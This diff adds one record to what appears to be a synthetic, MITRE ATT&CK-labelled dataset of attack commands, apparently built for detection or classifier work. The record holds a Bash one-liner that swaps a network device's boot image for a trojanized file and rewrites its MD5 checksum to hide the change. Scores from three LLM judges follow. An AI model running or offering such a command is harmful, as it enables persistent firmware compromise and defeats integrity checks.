@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cp -f /tmp/active.img.trojan /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Replaces the active system image with a trojanized image and immediately updates the checksum file to conceal the change.",
+  "rationale_steps": [
+    "Overwrite the active system image with a modified file",
+    "Flush writes to storage to ensure persistence",
+    "Recalculate and overwrite the stored MD5 to hide tampering"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-3d232f82",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags (-f), and correct syntax for all operations including file copying, sync, and md5sum generation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by replacing a legitimate firmware image with a trojanized version and updating the checksum file to evade detection mechanisms that verify firmware integrity.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:30:24.741300Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, separators, and redirection, adhering to standard Bash syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's actions (copying a trojan image and updating its checksum) are semantically aligned with T1601, the stated 'Privilege: None' makes its execution operationally implausible, as modifying system image files and system configuration files typically requires elevated privileges.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:30:41.392573Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash one-liner using valid commands, flags, && chaining, and redirection with no quoting or parsing issues.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually matches T1601 by overwriting the system image and updating a checksum to mask changes, but it unrealistically assumes no privileges and uses paths/mechanisms that may not exist on many network devices.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T19:30:49.650920Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
